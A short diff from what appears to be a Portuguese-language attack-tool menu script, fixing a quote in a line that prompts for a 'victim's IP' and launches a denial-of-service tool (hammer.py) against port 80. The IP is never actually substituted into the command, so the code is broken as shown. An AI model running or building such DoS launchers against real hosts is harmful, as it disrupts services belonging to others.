@@ -128,7 +128,7 @@ Version: {0}BETA{1}
 
         if ddos == '1':
             ip = input('\n\n\033[mDigite o IP da vítima: \033[1;31m\n\n')
-            os.system('python tools/hammer.py -s {} -p80 -t135)
+            os.system('python tools/hammer.py -s {} -p80 -t135')
             break
         else:
             print(menu)
